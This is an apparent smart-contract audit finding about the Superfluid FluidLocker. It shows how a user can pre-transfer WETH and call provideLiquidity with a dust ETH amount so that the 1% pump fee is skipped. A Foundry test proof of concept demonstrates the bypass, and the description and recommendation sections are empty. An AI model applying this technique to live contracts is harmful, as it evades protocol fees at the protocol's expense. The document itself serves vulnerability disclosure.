---
id: 25648
severity: "Crit/High"
---

# Pumponomics can be skipped when using FluidLocker::provideLiquidity

## Description



## Proof of Concept

Due to the difficulty of observing the effect of the pump function (1% difference), we directly modify the FluidLocker contract for visibility by creating a new field `uint256 public ethPumped;` and place it after all other fields that already exist. To use it, we insert this line into the beginning of the [_pump](<https://github.com/sherlock-audit/2025-06-superfluid-locker-system/blob/d8beaeed47f766659a1600a87372a7905109aa3c/fluid/packages/contracts/src/FluidLocker.sol#L639>) function `ethPumped += ethAmount;` These modification should not change the behaviour of the contract.

Now, paste the following test into FluidLockerTest contract inside FluidLocker.t.sol If needed, please import `import { IWETH9 } from "../src/token/IWETH9.sol";`

```solidity
    function testSkipPumponomics()
    external
    virtual
    {
        uint fundingAmount = 100e18;
        // Set up Alice's Locker to be functional
        // i. e. not revert due to "lack of funds", "no LP pool units", "no staker pool units", etc.
        _helperFundLocker(address(aliceLocker), fundingAmount);
        _helperLockerStake(address(bobLocker));
        _helperLockerProvideLiquidity(address(carolLocker));

        //Alice transfer the eth into locker via a plain call
        //Then call provideLiquidity with dust amount of eth
        //Therefore the pump function only pumps the dust eth amount, but the position is created with all eth in locker
        uint ethAmount = fundingAmount / (2 * 9900);
        address weth = _nonfungiblePositionManager.WETH9();
        vm.startPrank(ALICE);
        IWETH9(weth).deposit{ value: ethAmount }();
        IWETH9(weth).transfer(address(aliceLocker), ethAmount);
        aliceLocker.provideLiquidity{ value: 100 }(fundingAmount);
        vm.stopPrank();

        // Only a dust amount of eth has been pumped
        assertEq(FluidLocker(payable(address(aliceLocker))).ethPumped(), 1);
        // However, a position is opened with basically all the eth in the locker
        assertGt(FluidLocker(payable(address(aliceLocker))).activePositionCount(), 0);
        assertApproxEqAbs(0,
            IWETH9(weth).balanceOf(address(aliceLocker)),
            fundingAmount * 5 / 100 // 5% tolerance
        );
    }
```

## Recommendation

No recommendation provided.
